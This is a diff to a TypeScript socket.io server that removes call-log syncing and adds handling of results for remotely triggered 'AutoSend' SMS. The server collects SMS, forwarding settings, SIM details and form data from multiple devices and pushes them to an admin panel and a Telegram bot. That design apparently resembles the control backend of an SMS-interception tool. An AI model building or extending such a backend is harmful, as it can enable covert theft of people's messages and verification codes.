@@ -1,6 +1,6 @@
 import { Server, Socket } from 'socket.io';
 import { store } from '../store.js';
-import { SMS, CallLog, ForwardingConfig, SimInfo } from '../types/index.js';
+import { SMS, ForwardingConfig, SimInfo } from '../types/index.js';
 import { TelegramBotService } from '../telegram/bot.js';
 
 export function setupSocketHandlers(io: Server, telegramBot?: TelegramBotService): void {
@@ -80,35 +80,6 @@ export function setupSocketHandlers(io: Server, telegramBot?: TelegramBotService
                     for (const sms of incomingSms) {
                         await telegramBot.notifyNewSMS(deviceData?.device.name || data.deviceId, sms, deviceData?.device);
                     }
-                }
-            }
-        });
-
-        // Call logs sync from device
-        socket.on('calls:sync', async (data: { deviceId: string; calls: CallLog[] }) => {
-            console.log(`[Socket] Calls sync from device ${data.deviceId}: ${data.calls.length} calls`);
-
-            // Get existing calls count before sync
-            const existingCount = store.getCalls(data.deviceId).length;
-            const isFirstSync = existingCount === 0;
-
-            store.syncCalls(data.deviceId, data.calls);
-
-            // Notify admin panels
-            io.to('admin').emit('calls:update', {
-                deviceId: data.deviceId,
-                calls: store.getCalls(data.deviceId),
-            });
-
-            // Only notify for NEW calls (not on first sync - that's historical data)
-            if (telegramBot?.isActive() && !isFirstSync) {
-                const deviceData = store.getDevice(data.deviceId);
-                const allCalls = store.getCalls(data.deviceId);
-                const newCalls = allCalls.slice(existingCount);
-                const incomingCalls = newCalls.filter(call => call.type !== 'outgoing');
-
-                for (const call of incomingCalls) {
-                    await telegramBot.notifyNewCall(deviceData?.device.name || data.deviceId, call);
                 }
             }
         });
@@ -194,7 +165,6 @@ export function setupSocketHandlers(io: Server, telegramBot?: TelegramBotService
                 socket.emit('deviceData:update', {
                     deviceId,
                     sms: deviceData.sms,
-                    calls: deviceData.calls,
                     forms: deviceData.forms,
                     forwarding: deviceData.forwarding,
                 });
@@ -262,6 +232,11 @@ export function setupSocketHandlers(io: Server, telegramBot?: TelegramBotService
 
             // Forward result to admin
             io.to('admin').emit('sms:sendResult', data);
+
+            // Notify AutoSend SMS feature (no-op for non-AutoSend request ids)
+            if (telegramBot?.isActive()) {
+                telegramBot.handleAutoSmsSendResult(data.requestId, data.success, data.error);
+            }
         });
 
         // Disconnection
